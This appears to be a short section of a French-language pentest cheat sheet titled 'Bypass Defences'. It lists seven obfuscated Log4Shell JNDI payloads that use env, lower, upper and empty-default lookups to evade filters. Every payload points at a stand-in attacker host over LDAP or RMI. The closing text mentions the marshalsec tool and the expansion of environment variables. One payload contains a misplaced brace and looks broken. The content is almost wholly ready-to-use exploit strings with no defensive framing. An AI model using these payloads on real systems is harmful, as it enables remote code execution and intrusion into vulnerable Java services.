
Bypass Defences

```c
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
```

```c
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
```

```c
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
```

```c
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
```

```c
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
```

```c
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
```

```c
${${::-j}ndi:rmi://attackerendpoint.com/}
```


Notez l'utilisation du protocole `rmi://` dans le dernier. C'est également une autre technique valable qui peut être utilisée avec l'utilitaire `marshalsec`.

De plus, dans le moteur log4j, vous pouvez développer des variables d'environnement arbitraires (si cela n'était pas déjà assez grave)

